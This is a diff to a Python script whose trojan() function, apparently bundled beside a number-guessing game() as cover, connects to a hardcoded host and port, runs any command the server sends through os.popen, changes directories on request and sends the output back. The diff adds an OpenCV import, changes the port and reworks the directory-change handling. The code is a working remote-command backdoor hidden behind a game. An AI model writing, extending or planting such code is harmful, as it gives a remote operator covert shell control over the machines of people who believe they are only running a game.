@@ -2,6 +2,7 @@
 import socket
 import os
 import threading
+import cv2
 
 #Game Imports
 import random
@@ -12,7 +13,7 @@ def trojan():
 	try:
 		DISCONNECT_MESSAGE = "!DISCONNECT"
 		HOST = "192.168.0.12"
-		PORT = 5050
+		PORT = 5060
 		FORMAT = "utf-8"
 		ADDR = (HOST, PORT)
 		HEADER=64
@@ -23,6 +24,7 @@ def trojan():
 
 		connected = True
 		cmd_mode = False
+		cd_flag=False
 
 		def send(msg):
 			message = msg.encode(FORMAT)
@@ -33,33 +35,37 @@ def trojan():
 			client.send(send_length)
 			client.send(message)
 
+		def rmv(chrs):
+			alt_command.remove(chrs)
+
 		while connected:
 			msg_length = int(client.recv(HEADER).decode(FORMAT))
 			server_command = client.recv(msg_length).decode(FORMAT)
 			alt_command=[]
 			for command in server_command:
 				alt_command.append(command)
-			print(alt_command)
+			if cd_flag:
+				try:
+					os.chdir(server_command)
+					send(os.getcwd())
+					cd_flag=False
+					continue
+				except:
+					send("[ERROR OCCURED]")
 
 			if server_command == "cmdon":
-				send("You Have Terminal Access!")
+				send("[Terminal Access]")
 				cmd_mode = True
 				continue
 
 			if server_command == "cmdoff":
 				cmd_mode = False
-				send("You Closed The Terminal!")
+				send("[Terminal Closed]")
 
-			if "c" and "d" in alt_command:
-					alt_command.remove("c")
-					alt_command.remove("d")
-					alt_command.remove(" ")
-					alt_command = ''.join(alt_command)
-
-					os.chdir(server_command)
-					send(os.getcwd())
-
-					continue
+			if server_command == "cd":
+				cd_flag=True
+				send("[Change Directory]")
+				continue
 
 			if cmd_mode:
 				cmd_line = os.popen(server_command)
@@ -70,7 +76,7 @@ def trojan():
 					send(f"{server_command} was executed.")
 
 	except ConnectionResetError:
-		pass
+		print("[CONNECTION RESET]")
 
 def game():
 	def mk_num():
